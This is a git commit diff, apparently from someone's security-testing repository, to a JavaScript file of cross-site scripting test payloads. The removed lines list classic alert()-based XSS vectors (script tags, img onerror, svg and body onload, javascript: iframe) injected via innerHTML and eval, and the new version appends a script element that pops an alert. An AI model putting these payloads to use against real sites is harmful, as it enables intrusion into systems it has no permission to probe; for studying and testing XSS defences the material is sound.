c5c372c3e4a06005510182475723ea0c25833aa2
Saher Delgado <saherdelgado@gmail.com>
2024-08-07 15:53:07 -0300

    Update xss_payload_js.js
    new version

--- xss_payload_js.js
+++ xss_payload_js.js
@@ -1,24 +1,8 @@
-const xssPayloads = [
-  "<script>alert('XSS1')</script>",
-  "<img src='x' onerror='alert(\"XSS2\")'>",
-  "<svg onload='alert(\"XSS3\")'>",
-  "<body onload='alert(\"XSS4\")'>",
-  "alert('XSS')",
-  "<iframe src='javascript:alert(\"XSS5\")'></iframe>"
-];
+// Crear un nuevo elemento script
+const script = document.createElement('script');
 
-xssPayloads.forEach(payload => {
-  // Crear un nuevo elemento div
-  const div = document.createElement('div');
-  
-  // Insertar la carga útil en el div
-  div.innerHTML = payload;
-  
-  // Añadir el div al cuerpo del documento para ejecutar la carga útil
-  document.body.appendChild(div);
-  
-  // Si la carga útil es solo una alerta, ejecutarla directamente
-  if (payload.includes('alert')) {
-    eval(payload);
-  }
-});
+// Definir la carga útil de XSS
+script.innerHTML = "alert('XSS Vulnerability Detected');";
+
+// Añadir el script al cuerpo del documento para ejecutarlo
+document.body.appendChild(script);
